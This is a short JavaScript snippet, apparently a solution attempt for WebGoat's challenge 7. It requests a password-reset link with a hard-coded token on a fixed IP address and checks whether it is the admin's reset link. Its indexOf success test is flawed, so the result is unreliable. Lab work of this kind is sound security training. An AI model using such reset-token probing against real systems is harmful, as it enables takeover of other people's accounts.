var found = "NONE";

function getContent(token) {
    var theUrl = "http://129.241.200.165:8080/WebGoat/challenge/7/reset-password/" + token;
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    console.log(xmlHttp.responseText);
    if (xmlHttp.responseText.indexOf("That is not the reset link for admin")) {
        found = token;
    } else {
        found = "NONE1"
    }
}


getContent("7ce7a4802229f185a3a3fa29a7410345");